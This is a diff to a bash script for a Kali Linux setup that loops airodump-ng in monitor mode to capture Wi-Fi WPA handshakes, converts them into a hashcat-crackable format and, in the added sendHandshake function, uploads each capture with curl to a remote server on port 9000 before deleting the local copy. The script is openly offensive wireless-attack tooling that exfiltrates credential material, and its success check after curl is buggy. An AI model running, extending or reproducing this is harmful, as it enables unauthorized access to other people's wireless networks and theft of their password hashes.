@@ -5,11 +5,25 @@ checkUtils() {
   if [ ! -f /bin/cap2hccapx ]; then
     echo "No cap2hccapx"
     echo "Please, install cap2hccapx:"
-    echo "sudo apt install hcxtools"
-    echo "sudo cp /usr/lib/hashcat-utils/cap2hccapx.bin /bin/cap2hccapx"
+    echo "git clone https://github.com/hashcat/hashcat-utils.git"
+    echo "cd hashcat-utils/src"
+    echo "make"
+    echo "chmod +x cap2hccapx.bin"
+    echo "cp cap2hccapx.bin /bin"
     exit 1
   fi
-  
+
+}
+
+sendHandshake() {
+  echo $1
+  echo $2
+  curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/upload
+  if [[ $! == 0 ]]; then
+    rm $1
+  else
+    echo "Failed send file $1"
+  fi
 }
 
 checkHandshakes() {
@@ -22,15 +36,16 @@ checkHandshakes() {
   else
     echo "Handshakes detected!!!"
     if [[ -d /home/kali/shakes ]]; then
-
       if [[ $(ls /home/kali/shakes/ | wc -l) -ne 0 ]]; then
         lastNum=$(($(head -n 1 /home/kali/shakes/.counter) + 1))
         mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake${lastNum}
         echo $lastNum >/home/kali/shakes/.counter
+        sendHandshake /home/kali/shakes/shake${lastNum} $1
       else
         mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake1
         touch /home/kali/shakes/.counter
         echo "1" >/home/kali/shakes/.counter
+        sendHandshake /home/kali/shakes/shake1 $1
       fi
     else
       mkdir /home/kali/shakes
@@ -38,6 +53,7 @@ checkHandshakes() {
       mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake1
       touch /home/kali/shakes/.counter
       echo "1" >/home/kali/shakes/.counter
+      sendHandshake /home/kali/shakes/shake1 $1
     fi
   fi
   echo ""
@@ -81,7 +97,10 @@ passive() {
   airmon-ng start wlan1
 
   echo "Start airodump.."
-  airodump-ng -w /home/kali/shakes wlan1 </dev/null >/dev/null
+  timeout 60 airodump-ng -w /home/kali/shakes wlan1 </dev/null >/dev/null
+  checkHandshakes $1
+  rm /home/kali/shakes-*
+  passive
 }
 
 if [ $# -lt 1 ]; then
